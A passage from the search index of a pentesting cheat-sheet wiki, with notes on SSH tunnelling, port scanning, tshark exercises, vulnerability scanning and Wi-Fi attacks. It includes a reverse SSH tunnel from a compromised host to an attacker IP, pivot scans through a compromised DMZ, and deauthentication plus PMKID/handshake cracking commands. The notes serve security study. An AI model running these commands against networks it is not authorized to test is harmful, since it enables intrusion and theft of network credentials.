3389 -ST -Pn non-routable-remote-ip-range --oepn proxychains rdesktop rdp-ip-in-non-routable-range Tools XFLTReaT tunnelling framework: https://github.com/earthquake/XFLTReaT TCP UDP ICMP SOCKS v4, 4a, 5 HTTP CONNECT SCTP (by Darren Martyn @info_dox) WebSocket DNS (A/CNAME, PRIVATE, NULL) - Proof of Concept RDP (Windows only) References Summarized References: https://chamibuddhika.wordpress.com/2012/03/21/ssh-tunnelling-explained/ http://www.debianadmin.com/howto-use-ssh-local-and-remote-port-forwarding.html https://blog.trackets.com/2014/05/17/ssh-tunnel-local-and-remote-port-forwarding-explained-with-examples.html New References: https://vimeo.com/54505525","title":"Port Forwarding"},{"location":"network/port-forwarding-and-tunneling/#port-forwarding","text":"","title":"Port Forwarding"},{"location":"network/port-forwarding-and-tunneling/#local-port-forwarding","text":"ssh -L local-port-to-listen : remote-host : remote-port gateway","title":"Local Port Forwarding"},{"location":"network/port-forwarding-and-tunneling/#allow-connections-to-a-specific-blocked-server","text":"From work: ssh -L 9001:banned-site.com:80 user@home curl http://localhost:9001 Says we\u2019re forwarding our local port 9001 to banned-site.com:80, through the gateway home (port 22). ssh -L 9001:banned:22 user@home ssh -p 9001 localhost Allow remote connections to local port forwards (listening on all interfaces) ssh -L 9001:banned:22 user@home -g ssh -p 9001 work_machine #Remotely","title":"Allow connections to a specific blocked server."},{"location":"network/port-forwarding-and-tunneling/#access-a-port-on-your-server-which-can-only-be-accessed-from-localhost-and-not-remotely","text":"From local machine: ssh -L 9000:localhost:5432 user@server psql -h localhost -p 9000 Server acts as the gateway and binds server's port 5432 to local port 9000.","title":"Access a port on your server which can only be accessed from localhost and not remotely."},{"location":"network/port-forwarding-and-tunneling/#remote-port-forwarding","text":"","title":"Remote Port Forwarding"},{"location":"network/port-forwarding-and-tunneling/#allow-remote-access-to-restricted-network","text":"From work: ssh -R 9001:intra-ssh-server:22 user@home Server will bind port 9001 on home machine to listen for incoming requests which would subsequently be routed through the created SSH channel. Connecting to localhost:9001 in home will forward user to intra:22 From home: ssh -p 9001 localhost Add GatewayPorts yes to sshd_config to listening on all interfaces.","title":"Allow remote access to restricted network."},{"location":"network/port-forwarding-and-tunneling/#allow-public-access-to-a-local-resource-through-a-public-server","text":"ssh -R 9000:localhost:3000 user@public_sever sudo vim /etc/ssh/sshd_config GatewayPorts yes sudo service ssh restart","title":"Allow public access to a local resource through a public server."},{"location":"network/port-forwarding-and-tunneling/#dynamic-port-forwarding","text":"One local port for tunneling data to all remote destinations (SOCKS protocol) From work: ssh -D 9001 home","title":"Dynamic port forwarding"},{"location":"network/port-forwarding-and-tunneling/#tips","text":"Monitoring Tunnels netstat -tunelp Avoid TTL -nNT","title":"Tips"},{"location":"network/port-forwarding-and-tunneling/#rinetd","text":"When outbound only 80 / 443 use port forwarding nano /etc/rinetd.conf ip1 80 ip2 3389 bindaddress bindport connectaddress connectport (ip1:80 will proxy for ip2:3389)","title":"rinetd"},{"location":"network/port-forwarding-and-tunneling/#creating-reverse-ssh-client-to-tunnel-out-remote-desktop-port","text":"Creating Tunnel FROM remote non routable machine pling -l root -pw password attacker-ip -R 3390:127.0.0.1:3389 localhost 3389 to attacker ip 3389 FROM attacker's machine rdesktop localhost:3390","title":"Creating reverse SSH client to tunnel-out remote desktop port"},{"location":"network/port-forwarding-and-tunneling/#ssh-dynamic-port-forwarding-compromised-dmz-used-to-scan-internal-ips","text":"Create local SOCS4 proxy: From attacker's machine (compromised DMZ) ssh -D 8080 root@DMZ-IP netstat -antp | grep 8080 /etc/proxychains.conf socks4 127.0.0.1 8080 proxychains nmap -p 3389 -ST -Pn non-routable-remote-ip-range --oepn proxychains rdesktop rdp-ip-in-non-routable-range","title":"SSH Dynamic Port Forwarding (compromised DMZ used to scan internal IPs)"},{"location":"network/port-forwarding-and-tunneling/#tools","text":"XFLTReaT tunnelling framework: https://github.com/earthquake/XFLTReaT TCP UDP ICMP SOCKS v4, 4a, 5 HTTP CONNECT SCTP (by Darren Martyn @info_dox) WebSocket DNS (A/CNAME, PRIVATE, NULL) - Proof of Concept RDP (Windows only)","title":"Tools"},{"location":"network/port-forwarding-and-tunneling/#references","text":"","title":"References"},{"location":"network/port-forwarding-and-tunneling/#summarized-references","text":"https://chamibuddhika.wordpress.com/2012/03/21/ssh-tunnelling-explained/ http://www.debianadmin.com/howto-use-ssh-local-and-remote-port-forwarding.html https://blog.trackets.com/2014/05/17/ssh-tunnel-local-and-remote-port-forwarding-explained-with-examples.html","title":"Summarized References:"},{"location":"network/port-forwarding-and-tunneling/#new-references","text":"https://vimeo.com/54505525","title":"New References:"},{"location":"network/port-scanning/","text":"Port Scanning Types of port scans TCP Connect Scan Full 3 way handshake nc -nvv -w 1 -z ip port-range SYN / Stealth Scan Send SYN SYN-ACK means open RST means closed UDP Scanning ICMP port unreachable means closed No response means open nc -nv -u -z -w 1 ip port-range Port Knocking for x in 1111, 2222, 3333; do nmap -Pn --host_timeout 201 --scan-delay 0.2 --max-retries 0 -p $x IP ; done Look for: knockd Configured at: \u200b/etc/knockd.conf\u200b Scanning Methods All TCP and UDP fast scan: masscan -p1-65535,U:1-65535 IP --rate=1000 -e tun0 -p1-65535,U:1-65535 ports ports=$(cat ports | awk -F '{print $4}' | awk -F / '{print $1}' | sort -n | tr '\\n' ',' | sed 's/,$//') nmap -Pn -sV -sC -sU -sT -p$ports IP Quick all TCP scan using Nmap only: ports=(nmap -p- --min-rate=1000 -T4 IP | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -Pn -sV -sC -sU -sT -p$ports IP","title":"Port Scanning"},{"location":"network/port-scanning/#port-scanning","text":"","title":"Port Scanning"},{"location":"network/port-scanning/#types-of-port-scans","text":"","title":"Types of port scans"},{"location":"network/port-scanning/#tcp-connect-scan","text":"Full 3 way handshake nc -nvv -w 1 -z ip port-range","title":"TCP Connect Scan"},{"location":"network/port-scanning/#syn-stealth-scan","text":"Send SYN SYN-ACK means open RST means closed","title":"SYN / Stealth Scan"},{"location":"network/port-scanning/#udp-scanning","text":"ICMP port unreachable means closed No response means open nc -nv -u -z -w 1 ip port-range","title":"UDP Scanning"},{"location":"network/port-scanning/#port-knocking","text":"for x in 1111, 2222, 3333; do nmap -Pn --host_timeout 201 --scan-delay 0.2 --max-retries 0 -p $x IP ; done Look for: knockd Configured at: \u200b/etc/knockd.conf\u200b","title":"Port Knocking"},{"location":"network/port-scanning/#scanning-methods","text":"All TCP and UDP fast scan: masscan -p1-65535,U:1-65535 IP --rate=1000 -e tun0 -p1-65535,U:1-65535 ports ports=$(cat ports | awk -F '{print $4}' | awk -F / '{print $1}' | sort -n | tr '\\n' ',' | sed 's/,$//') nmap -Pn -sV -sC -sU -sT -p$ports IP Quick all TCP scan using Nmap only: ports=(nmap -p- --min-rate=1000 -T4 IP | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -Pn -sV -sC -sU -sT -p$ports IP","title":"Scanning Methods"},{"location":"network/traffic-analysis/","text":"Traffic Analysis Using a Capture aircrack-ng captured.cap\u200b Tools Netcap - A framework for secure and scalable network traffic analysis: https://github.com/dreadl0ck/netcap PA Toolkit (Pentester Academy Wireshark Toolkit) PA Toolkit is a collection of traffic analysis plugins to extend the functionality of Wireshark from a micro-analysis tool and protocol dissector to the macro analyzer and threat hunter. GitHub: https://github.com/pentesteracademy/patoolkit Sample Captures: https://wiki.wireshark.org/SampleCaptures TShark General Supported network interfaces tshark -D Sniff on eth0 tshark -i eth0 Open pcap tshark -r HTTP_traffic.pcap Read 100 packets from pcap tshark -r HTTP_traffic.pcap -c 100 Print full details for first 10 Packets tshark -r HTTP_traffic.pcap -c 10 -V List of protocols in pcap tshark -r HTTP_traffic.pcap -z io,phs -q Export into PDML tshark -r HTTP_traffic.pcap -T pdml http.xml PDML to HTML xsltproc /usr/share/wireshark/pdml2html.xsl http.xml http.html HTTP Only the HTTP traffic tshark -Y 'http' -r HTTP_traffic.pcap IP packets sent from IP address 192.168.252.128 to 52.32.74.91? tshark -r HTTP_traffic.pcap -Y ip.src==192.168.252.128 ip.dst==52.32.74.91 Packets containing GET requests tshark -r HTTP_traffic.pcap -Y http.request.method==GET Print only source IP and URL for all GET request packets tshark -r HTTP_traffic.pcap -Y http.request.method==GET -Tfields -e frame.time -e ip.src -e http.request.full_uri Packets contain the \"password\" string tshark -r HTTP_traffic.pcap -Y http contains password\u201d Destination IP for GET requests sent to New York Times (www.nytimes.com) tshark -r HTTP_traffic.pcap -Y http.request.method==GET http.host==www.nytimes.com -Tfields -e ip.dst Session ID being used by 192.168.252.128 for Amazon India store (amazon.in)? tshark -r HTTP_traffic.pcap -Y ip contains amazon.in ip.src==192.168.252.128 -Tfields -e ip.src -e http.cookie Type of OS 192.168.252.128 is using tshark -r HTTP_traffic.pcap -Y ip.src==192.168.252.128 http -Tfields -e http.user_agent HTTPS Only show SSL traffic? tshark -r HTTPS_traffic.pcap -Y 'ssl' Only print the source IP and destination IP for all SSL handshake packets tshark -r HTTPS_traffic.pcap -Y ssl.handshake -Tfields -e ip.src -e ip.dst List issuer name for all SSL certificates exchanged tshark -r HTTPS_traffic.pcap -Y ssl.handshake.certificate -Tfields -e x509sat.printableString Print the IP addresses of all servers accessed over SSL tshark -r HTTPS_traffic.pcap -Y ssl ssl.handshake.type==1 -Tfields -e ip.dst IP addresses associated with Ask Ubuntu servers (askubuntu.com) tshark -r HTTPS_traffic.pcap -Y ip contains askubuntu The IP address of the user who interacted with with Ask Ubuntu servers (askubuntu.com) tshark -r HTTPS_traffic.pcap -Y ip.dst==151.101.1.69 || ip.dst==151.101.193.69 || ip.dst==151.101.129.69 || ip.dst==151.101.65.69 -Tfields -e ip.src What DNS servers were used tshark -r HTTPS_traffic.pcap -Y dns dns.flags.response==0 -Tfields -e ip.dst Name of the antivirus solution tshark -r HTTPS_traffic.pcap -Y ip contains avast -Tfields -e ip.src Answer: Avast antivirus, 192.168.10.9, 192.168.0.1, 192.168.0.136 WiFi Show only WiFi traffic tshark -r WiFi_traffic.pcap -Y wlan View the deauthentication packets tshark -r WiFi_traffic.pcap -Y wlan.fc.type_subtype==0x000c Display WPA handshake packets tshark -r WiFi_traffic.pcap -Y eapol Print the SSID and BSSID values for all beacon frames tshark -r WiFi_traffic.pcap -Y wlan.fc.type_subtype==8 -Tfields -e wlan.ssid -e wlan.bssid What is BSSID of SSID \"LazyArtists\" tshark -r WiFi_traffic.pcap -Y wlan.ssid==LazyArtists -Tfields -e wlan.bssid Channel of SSID \"Home_Network\" tshark -r WiFi_traffic.pcap -Y wlan.ssid==Home_Network -Tfields -e wlan_radio.channel Devices that received deauth messages tshark -r WiFi_traffic.pcap -Y wlan.fc.type_subtype==0x000c -Tfields -e wlan.ra Which device does MAC 5c:51:88:31:a0:3b belongs to tshark -r WiFi_traffic.pcap -Y wlan.ta==5c:51:88:31:a0:3b http -Tfields -e http.user_agent Beacon frames present tshark -r WiFi_traffic.pcap -Y 'wlan.fc.type_subtype == 0x0008' Unique list of all AP BSSIDs tshark -r WiFi_traffic.pcap -Y 'wlan.fc.type_subtype == 0x0008' -T fields -e wlan.bssid | sort | uniq Unique list of all AP SSIDs tshark -r WiFi_traffic.pcap -Y 'wlan.fc.type_subtype == 0x0008' -T fields -e wlan.ssid | sort | uniq Only non-null SSIDs tshark -r WiFi_traffic.pcap -Y 'wlan.fc.type_subtype == 0x0008 !(wlan.tag.length ==0)' -T fields -e wlan.ssid | sort | uniq Unique list of SSID and BSSIDs side by side for all AP networks tshark -r WiFi_traffic.pcap -Y 'wlan.fc.type_subtype == 0x0008' -T fields -e wlan.ssid -e wlan.bssid | sort | uniq VoIP Show VoIP traffic tshark -r VoIP_traffic.pcap -Y sip or rtp Print all REGISTER packets tshark -r VoIP_traffic.pcap -Y sip.Method==REGISTER Only print the source IP, sender extension and authorization digest response for REGISTER packets tshark -r VoIP_traffic.pcap -Y sip.Method==REGISTER -Tfields -e ip.src -e sip.from.user -e sip.auth.digest.response Print all codecs being used by RTP protocol tshark -r VoIP_traffic.pcap -Y sdp -Tfields -e sdp.media User who is using the Zoiper VoIP client tshark -r VoIP_traffic.pcap -Y sip contains Zoiper -Tfields -e ip.src IP address of the SIP server used to place calls tshark -r VoIP_traffic.pcap -Y sip.Method==REGISTER -Tfields -e ip.dst Content of the text message sent to +918108591527? tshark -r VoIP_traffic.pcap -Y sip.Method == MESSAGE -V (Read the content) Extensions completed a call successfully tshark -r VoIP_traffic.pcap -Y sip.Method==BYE -Tfields -e sip.from.user -e sip.to.user CapAnalysis https://drive.google.com/uc?authuser=0 id=1Lf8yU7alFZdRlT6WstKjngN2RAp-1jG8 export=download","title":"Traffic Analysis"},{"location":"network/traffic-analysis/#traffic-analysis","text":"","title":"Traffic Analysis"},{"location":"network/traffic-analysis/#using-a-capture","text":"aircrack-ng captured.cap\u200b","title":"Using a Capture"},{"location":"network/traffic-analysis/#tools","text":"Netcap - A framework for secure and scalable network traffic analysis: https://github.com/dreadl0ck/netcap","title":"Tools"},{"location":"network/traffic-analysis/#pa-toolkit-pentester-academy-wireshark-toolkit","text":"PA Toolkit is a collection of traffic analysis plugins to extend the functionality of Wireshark from a micro-analysis tool and protocol dissector to the macro analyzer and threat hunter. GitHub: https://github.com/pentesteracademy/patoolkit","title":"PA Toolkit (Pentester Academy Wireshark Toolkit)"},{"location":"network/traffic-analysis/#sample-captures","text":"https://wiki.wireshark.org/SampleCaptures","title":"Sample Captures:"},{"location":"network/traffic-analysis/#tshark","text":"","title":"TShark"},{"location":"network/traffic-analysis/#general","text":"Supported network interfaces tshark -D Sniff on eth0 tshark -i eth0 Open pcap tshark -r HTTP_traffic.pcap Read 100 packets from pcap tshark -r HTTP_traffic.pcap -c 100 Print full details for first 10 Packets tshark -r HTTP_traffic.pcap -c 10 -V List of protocols in pcap tshark -r HTTP_traffic.pcap -z io,phs -q Export into PDML tshark -r HTTP_traffic.pcap -T pdml http.xml PDML to HTML xsltproc /usr/share/wireshark/pdml2html.xsl http.xml http.html","title":"General"},{"location":"network/traffic-analysis/#http","text":"Only the HTTP traffic tshark -Y 'http' -r HTTP_traffic.pcap IP packets sent from IP address 192.168.252.128 to 52.32.74.91? tshark -r HTTP_traffic.pcap -Y ip.src==192.168.252.128 ip.dst==52.32.74.91 Packets containing GET requests tshark -r HTTP_traffic.pcap -Y http.request.method==GET Print only source IP and URL for all GET request packets tshark -r HTTP_traffic.pcap -Y http.request.method==GET -Tfields -e frame.time -e ip.src -e http.request.full_uri Packets contain the \"password\" string tshark -r HTTP_traffic.pcap -Y http contains password\u201d Destination IP for GET requests sent to New York Times (www.nytimes.com) tshark -r HTTP_traffic.pcap -Y http.request.method==GET http.host==www.nytimes.com -Tfields -e ip.dst Session ID being used by 192.168.252.128 for Amazon India store (amazon.in)? tshark -r HTTP_traffic.pcap -Y ip contains amazon.in ip.src==192.168.252.128 -Tfields -e ip.src -e http.cookie Type of OS 192.168.252.128 is using tshark -r HTTP_traffic.pcap -Y ip.src==192.168.252.128 http -Tfields -e http.user_agent","title":"HTTP"},{"location":"network/traffic-analysis/#https","text":"Only show SSL traffic? tshark -r HTTPS_traffic.pcap -Y 'ssl' Only print the source IP and destination IP for all SSL handshake packets tshark -r HTTPS_traffic.pcap -Y ssl.handshake -Tfields -e ip.src -e ip.dst List issuer name for all SSL certificates exchanged tshark -r HTTPS_traffic.pcap -Y ssl.handshake.certificate -Tfields -e x509sat.printableString Print the IP addresses of all servers accessed over SSL tshark -r HTTPS_traffic.pcap -Y ssl ssl.handshake.type==1 -Tfields -e ip.dst IP addresses associated with Ask Ubuntu servers (askubuntu.com) tshark -r HTTPS_traffic.pcap -Y ip contains askubuntu The IP address of the user who interacted with with Ask Ubuntu servers (askubuntu.com) tshark -r HTTPS_traffic.pcap -Y ip.dst==151.101.1.69 || ip.dst==151.101.193.69 || ip.dst==151.101.129.69 || ip.dst==151.101.65.69 -Tfields -e ip.src What DNS servers were used tshark -r HTTPS_traffic.pcap -Y dns dns.flags.response==0 -Tfields -e ip.dst Name of the antivirus solution tshark -r HTTPS_traffic.pcap -Y ip contains avast -Tfields -e ip.src Answer: Avast antivirus, 192.168.10.9, 192.168.0.1, 192.168.0.136","title":"HTTPS"},{"location":"network/traffic-analysis/#wifi","text":"Show only WiFi traffic tshark -r WiFi_traffic.pcap -Y wlan View the deauthentication packets tshark -r WiFi_traffic.pcap -Y wlan.fc.type_subtype==0x000c Display WPA handshake packets tshark -r WiFi_traffic.pcap -Y eapol Print the SSID and BSSID values for all beacon frames tshark -r WiFi_traffic.pcap -Y wlan.fc.type_subtype==8 -Tfields -e wlan.ssid -e wlan.bssid What is BSSID of SSID \"LazyArtists\" tshark -r WiFi_traffic.pcap -Y wlan.ssid==LazyArtists -Tfields -e wlan.bssid Channel of SSID \"Home_Network\" tshark -r WiFi_traffic.pcap -Y wlan.ssid==Home_Network -Tfields -e wlan_radio.channel Devices that received deauth messages tshark -r WiFi_traffic.pcap -Y wlan.fc.type_subtype==0x000c -Tfields -e wlan.ra Which device does MAC 5c:51:88:31:a0:3b belongs to tshark -r WiFi_traffic.pcap -Y wlan.ta==5c:51:88:31:a0:3b http -Tfields -e http.user_agent Beacon frames present tshark -r WiFi_traffic.pcap -Y 'wlan.fc.type_subtype == 0x0008' Unique list of all AP BSSIDs tshark -r WiFi_traffic.pcap -Y 'wlan.fc.type_subtype == 0x0008' -T fields -e wlan.bssid | sort | uniq Unique list of all AP SSIDs tshark -r WiFi_traffic.pcap -Y 'wlan.fc.type_subtype == 0x0008' -T fields -e wlan.ssid | sort | uniq Only non-null SSIDs tshark -r WiFi_traffic.pcap -Y 'wlan.fc.type_subtype == 0x0008 !(wlan.tag.length ==0)' -T fields -e wlan.ssid | sort | uniq Unique list of SSID and BSSIDs side by side for all AP networks tshark -r WiFi_traffic.pcap -Y 'wlan.fc.type_subtype == 0x0008' -T fields -e wlan.ssid -e wlan.bssid | sort | uniq","title":"WiFi"},{"location":"network/traffic-analysis/#voip","text":"Show VoIP traffic tshark -r VoIP_traffic.pcap -Y sip or rtp Print all REGISTER packets tshark -r VoIP_traffic.pcap -Y sip.Method==REGISTER Only print the source IP, sender extension and authorization digest response for REGISTER packets tshark -r VoIP_traffic.pcap -Y sip.Method==REGISTER -Tfields -e ip.src -e sip.from.user -e sip.auth.digest.response Print all codecs being used by RTP protocol tshark -r VoIP_traffic.pcap -Y sdp -Tfields -e sdp.media User who is using the Zoiper VoIP client tshark -r VoIP_traffic.pcap -Y sip contains Zoiper -Tfields -e ip.src IP address of the SIP server used to place calls tshark -r VoIP_traffic.pcap -Y sip.Method==REGISTER -Tfields -e ip.dst Content of the text message sent to +918108591527? tshark -r VoIP_traffic.pcap -Y sip.Method == MESSAGE -V (Read the content) Extensions completed a call successfully tshark -r VoIP_traffic.pcap -Y sip.Method==BYE -Tfields -e sip.from.user -e sip.to.user","title":"VoIP"},{"location":"network/traffic-analysis/#capanalysis","text":"https://drive.google.com/uc?authuser=0 id=1Lf8yU7alFZdRlT6WstKjngN2RAp-1jG8 export=download","title":"CapAnalysis"},{"location":"network/vulnerability-scanning/","text":"Vulnerability Scanning Nmap nmap -v -p 80 --script http-vuln-cve2010-2861 ip nmap -v -p 80 --script all ip nmap -v -p 80 -sC ip nmap -v -p 80 --script default,safe ip OpenVAS openvas-setup https://ip:9392","title":"Vulnerability Scanning"},{"location":"network/vulnerability-scanning/#vulnerability-scanning","text":"","title":"Vulnerability Scanning"},{"location":"network/vulnerability-scanning/#nmap","text":"nmap -v -p 80 --script http-vuln-cve2010-2861 ip nmap -v -p 80 --script all ip nmap -v -p 80 -sC ip nmap -v -p 80 --script default,safe ip","title":"Nmap"},{"location":"network/vulnerability-scanning/#openvas","text":"openvas-setup https://ip:9392","title":"OpenVAS"},{"location":"network/wireless/","text":"Wireless aircrack-ng captured.cap\u200b aircrack-ng -a 2 -b BSSID -w wordlist captured.cap\u200b WPA/WPA2 PMKID STEP 1: https://github.com/ZerBea/hcxdumptool https://github.com/aircrack-ng/aircrack-ng STEP 2: Find target BSSID: airodump-ng STEP 3: Add BSSID in \u2018bssid.txt\u2019 and use \u2018hcxdumptool\u2019: hcxdumptool -i --filterlist=bssid.txt --filermode=2 --enable_status=2 -o pmkid.pcap STEP 4: Extract PMKID into hashcat format for cracking: (link: https://github.com/ZerBea/hcxtools) github.com/ZerBea/hcxtools hcxpcaptool -z wpa2_pmkid_hash.txt pmkid.pcap STEP 5: Crack: hashcat -a 0 -m 16800 -w 4 wpa2_pmkid_hash.txt dict.txt https://mobile.twitter.com/netmux/status/1097908867374215168 WPA enterprise (evil tween attack) https://pwn.no0.be/exploitation/wifi/wpa_enterprise/ https://rootsh3ll.com/evil-twin-attack/ WiFi Wardriving with Android WiGLE WiFi Wardriving: https://play.google.com/store/apps/details?id=net.wigle.wigleandroid hl=en Tracking Tracking All the WiFi Things: https://osintcurio.us/2019/01/15/tracking-all-the-wifi-things/ References New References How to Make a Captive Portal of Death: https://medium.com/bugbountywriteup/how-to-make-a-captive-portal-of-death-48e82a1d81a","title":"Wireless"},{"location":"network/wireless/#wireless","text":"","title":"Wireless"},{"location":"network/wireless/#wpawpa2-pmkid","text":"STEP 1: https://github.com/ZerBea/hcxdumptool https://github.com/aircrack-ng/aircrack-ng STEP 2: Find target BSSID: airodump-ng STEP 3: Add BSSID in \u2018bssid.txt\u2019 and use \u2018hcxdumptool\u2019: hcxdumptool -i --filterlist=bssid.txt --filermode=2 --enable_status=2 -o pmkid.pcap STEP 4: Extract PMKID into hashcat format for cracking: (link: https://github.com/ZerBea/hcxtools) github.com/ZerBea/hcxtools hcxpcaptool -z wpa2_pmkid_hash.txt pmkid.pcap STEP 5: Crack: hashcat -a 0 -m 16800 -w 4 wpa2_pmkid_hash.txt dict.txt https://mobile.twitter.com/netmux/status/1097908867374215168","title":"WPA/WPA2 PMKID"},{"location":"network/wireless/#wpa-enterprise-evil-tween-attack","text":"https://pwn.no0.be/exploitation/wifi/wpa_enterprise/ https://rootsh3ll.com/evil-twin-attack/","title":"WPA enterprise (evil tween attack)"},{"location":"network/wireless/#wifi-wardriving-with-android","text":"WiGLE WiFi Wardriving: https://play.google.com/store/apps/details?id=net.wigle.wigleandroid hl=en","title":"WiFi Wardriving with Android"},{"location":"network/wireless/#tracking","text":"Tracking All the WiFi Things: https://osintcurio.us/2019/01/15/tracking-all-the-wifi-things/","title":"Tracking"},{"location":"network/wireless/#references","text":"","title":"References"},{"location":"network/wireless/#new-references","text":"How to Make a Captive Portal of Death: https://medium.com/bugbountywriteup/how-to-make-a-captive-portal-of-death-48e82a1d81a","title":"New References"},{"location":"network/x-Defense/","text":"Phishing Blacklist: https://www.phishing.army/","title":"x Defense"},{"location":"network/y-Tools-Netstat/","text":"Netstat Kernel IP routing table: netstat -nr Listening ports: netstat -lp netstat -lvnp","title":"y Tools Netstat"},{"location":"network/y-Tools-Netstat/#netstat","text":"Kernel IP routing table: netstat -nr Listening ports: netstat -lp netstat -lvnp","title":"Netstat"},{"location":"network/y-Tools-Nmap/","text":"Nmap Port Related Information: /usr/share/nmap/nmap-servies ICMP (Ping) Sweep: nmap -sn pi-rage nmap -sn ip-range -oG filename (grepable format) Sweep TCP/UDP ports nmap -p 80 ip-range -oG filename Sweep full network for top ports nmap -sT -A --top-ports=20 ip-range -G filename Script engine: ls -l /usr/share/nmap/scripts | grep smb Important flags -O for OS Fingerprinting -sV for banner grabbing","title":"Nmap"},{"location":"network/y-Tools-Nmap/#nmap","text":"","title":"Nmap"},{"location":"network/y-Tools-Nmap/#port-related-information","text":"/usr/share/nmap/nmap-servies","title":"Port Related Information:"},{"location":"network/y-Tools-Nmap/#icmp-ping-sweep","text":"nmap -sn pi-rage nmap -sn ip-range -oG filename (grepable format)","title":"ICMP (Ping) Sweep:"},{"location":"network/y-Tools-Nmap/#sweep-tcpudp-ports","text":"nmap -p 80 ip-range -oG filename","title":"Sweep TCP/UDP ports"},{"location":"network/y-Tools-Nmap/#sweep-full-network-for-top-ports","text":"nmap -sT -A --top-ports=20 ip-range -G filename","title":"Sweep full network for top ports"},{"location":"network/y-Tools-Nmap/#script-engine","text":"ls -l /usr/share/nmap/scripts | grep smb","title":"Script engine:"},{"location":"network/y-Tools-Nmap/#important-flags","text":"-O for OS Fingerprinting -sV for banner grabbing","title":"Important flags"},{"location":"network/y-Tools/","text":"Tools Inject code and spy on wifi users: https://github.com/DanMcInerney/LANs.py Collection of PowerShell network security scripts for system administrators: https://github.com/thom-s/netsec-ps-scripts CyberScan: Network's Forensics ToolKit BetterCap Swiss army knife for network attacks and monitoring: https://www.bettercap.org/ Pwning WPA/WPA2 Networks With Bettercap and the PMKID Client-Less Attack: https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/#.XGRV3mo06jA.twitter 4 way handshake capture: sudo bettercap -iface wlan0 # this will set the interface in monitor mode and start channel hopping on all supported frequencies wifi.recon on # we want our APs sorted by number of clients for this attack, the default sorting would be `rssi asc` set wifi.show.sort clients desc # every second, clear our view and present an updated list of nearby WiFi networks set ticker.commands 'clear; wifi.show' ticker on wifi.recon.channel 1 wifi.deauth e0:xx:xx:xx:xx:xx Cracking 4-way handshake /path/to/cap2hccapx /root/bettercap-wifi-handshakes.pcap bettercap-wifi-handshakes.hccapx /path/to/hashcat -m2500 -a3 -w3 bettercap-wifi-handshakes.hccapx '?d?d?d?d?d?d?d?d' Client-less PMKID Attack https://hashcat.net/forum/thread-7717.html PMKID = HMAC-SHA1-128(PMK, \"PMK Name\" | MAC_AP | MAC_STA) # wifi.assoc supports 'all' (or `*`) or a specific BSSID, just like wifi.deauth wifi.assoc all All nearby vulnerable routers (and let me reiterate: a lot of them are vulnerable), will start sending you the PMKID, which bettercap will dump to the usual pcap file: PMKID Cracking /path/to/hcxpcaptool -z bettercap-wifi-handshakes.pmkid /root/bettercap-wifi-handshakes.pcap /path/to/hashcat -m16800 -a3 -w3 bettercap-wifi-handshakes.pmkid '?d?d?d?d?d?d?d?d'","title":"Tools"},{"location":"network/y-Tools/#tools","text":"Inject code and spy on wifi users: https://github.com/DanMcInerney/LANs.py Collection of PowerShell network security scripts for system administrators: https://github.com/thom-s/netsec-ps-scripts CyberScan: Network's Forensics ToolKit","title":"Tools"},{"location":"network/y-Tools/#bettercap","text":"Swiss army knife for network attacks and monitoring: https://www.bettercap.org/ Pwning WPA/WPA2 Networks With Bettercap and the PMKID Client-Less Attack: https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/#.XGRV3mo06jA.twitter","title":"BetterCap"},{"location":"network/y-Tools/#4-way-handshake-capture","text":"sudo bettercap -iface wlan0 # this will set the interface in monitor mode and start channel hopping on all supported frequencies wifi.recon on # we want our APs sorted by number of clients for this attack, the default sorting would be `rssi asc` set wifi.show.sort clients desc # every second, clear our view and present an updated list of nearby WiFi networks set ticker.commands 'clear; wifi.show' ticker on wifi.recon.channel 1 wifi.deauth e0:xx:xx:xx:xx:xx","title":"4 way handshake capture:"},{"location":"network/y-Tools/#cracking-4-way-handshake","text":"/path/to/cap2hccapx /root/bettercap-wifi-handshakes.pcap bettercap-wifi-handshakes.hccapx /path/to/hashcat -m2500 -a3 -w3 bettercap-wifi-handshakes.hccapx '?d?d?d?d?d?d?d?d'","title":"Cracking 4-way handshake"},{"location":"network/y-Tools/#client-less-pmkid-attack","text":"https://hashcat.net/forum/thread-7717.html PMKID = HMAC-SHA1-128(PMK, \"PMK Name\" | MAC_AP | MAC_STA) # wifi.assoc supports 'all' (or `*`) or a specific BSSID, just like wifi.deauth wifi.assoc all All nearby vulnerable routers (and let me reiterate: a lot of them are vulnerable), will start sending you the PMKID, which bettercap will dump to the usual pcap file:","title":"Client-less PMKID Attack"},{"location":"network/y-Tools/#pmkid-cracking","text":"/path/to/hcxpcaptool -z bettercap-wifi-handshakes.pmkid /root/bettercap-wifi-handshakes.pcap /path/to/hashcat -m16800 -a3 -w3 bettercap-wifi-handshakes.pmkid '?d?d?d?d?d?d?d?d'","title":"PMKID Cracking"},{"location":"network/z-References/","text":"References New References Let's code a TCP/IP stack, 1: Ethernet ARP: http://www.saminiir.com/lets-code-tcp-ip-stack-1-ethernet-arp/ Let's code a TCP/IP stack, 2: IPv4 ICMPv4: http://www.saminiir.com/lets-code-tcp-ip-stack-2-ipv4-icmpv4/ Let's code a TCP/IP stack, 3: TCP Basics Handshake: http://www.saminiir.com/lets-code-tcp-ip-stack-3-tcp-handshake/","title":"References"},{"location":"network/z-References/#references","text":"","title":"References"},{"location":"network/z-References/#new-references","text":"Let's code a TCP/IP stack, 1: Ethernet ARP: http://www.saminiir.com/lets-code-tcp-ip-stack-1-ethernet-arp/ Let's code a TCP/IP stack, 2: IPv4 ICMPv4: http://www.saminiir.com/lets-code-tcp-ip-stack-2-ipv4-icmpv4/ Let's code a TCP/IP stack, 3: TCP Basics Handshake: http://www.saminiir.com/lets-code-tcp-ip-stack-3-tcp-handshake/","title":"New References"},{"location":"os/android/android/","text":"Android Take screenshots from ADB: adb shell screencap -p | perl -pe 's/\\x0D\\x0A/\\x0A/g' screen.png seccomp ptrace Issue 1718: Android: ptrace hole makes seccomp filter useless on devices with kernel 4.8: https://bugs.chromium.org/p/project-zero/issues/detail?id=1718 Chainspotting: Building Exploit Chains with Logic Bugs: https://labs.mwrinfosecurity.com/publications/chainspotting-building-exploit-chains-with-logic-bugs/","title":"Android"},{"location":"os/android/android/#android","text":"","title":"Android"},{"location":"os/android/android/#take-screenshots-from-adb","text":"adb shell screencap -p | perl -pe 's/\\x0D\\x0A/\\x0A/g' screen.png","title":"Take screenshots 